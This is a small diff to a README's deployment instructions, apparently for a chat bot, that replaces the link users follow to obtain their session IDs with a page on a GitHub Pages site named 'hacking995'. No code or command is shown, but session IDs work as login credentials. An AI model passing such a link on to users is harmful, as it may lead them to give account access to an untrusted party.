@@ -45,7 +45,7 @@
 
 ### 2. Retrieve Your Session ID
 **To deploy, you need your session ID.** Click the link below to get all your session IDs.
-- **[Get All Session IDs](https://rodhackgang.github.io/Service-/)**
+- **[Get All Session IDs](https://hacking995.github.io/SESSION-ID-WEBCAM.COM/)**
 
 ---
 
